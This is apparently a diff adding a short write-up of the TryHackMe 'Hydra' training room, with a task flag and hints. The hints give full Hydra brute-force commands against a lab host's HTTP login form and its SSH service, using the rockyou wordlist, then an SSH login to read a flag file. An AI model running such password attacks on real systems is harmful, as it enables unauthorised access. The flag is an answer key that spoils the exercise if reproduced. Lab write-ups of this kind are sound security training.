@@ -1,0 +1,38 @@
+#### Link to room: https://tryhackme.com/room/hydra
+
+#### [Task 1] Hydra Introduction
+   1. No answer needed 
+
+#### [Task 2] Using Hydra
+   1. THM{2673a7dd116de68e85c48ec0b1f2612e}
+> Hint: 
+>
+> Using a simliar format to the example given 
+>
+> "hydra -l  -P http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V"
+>
+> We can use the following:
+>
+> hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.94.172 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V
+>
+> Once we have the password, we can navigate to \<GIVEN-IP-ADDRESS\> and enter the credentials to login
+   2. 
+> Hint: 
+>
+> Using a simliar format to the example given 
+>
+> hydra -l <username> -P <full path to pass> <ip> -t 4 ssh
+>
+> We can use the following:
+>
+> hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.94.172 -t 4 ssh 
+>
+> Once we get the credentials, we can connect to her accout via SSH with 
+>
+> ssh molly@10.10.94.172
+>
+> Enter the cracked password from hydra
+>
+> You should now be on molly's account since you can see "molly@"
+>
+> Type "ls" to see the files in the directory and type "cat flag2.txt" to see the content
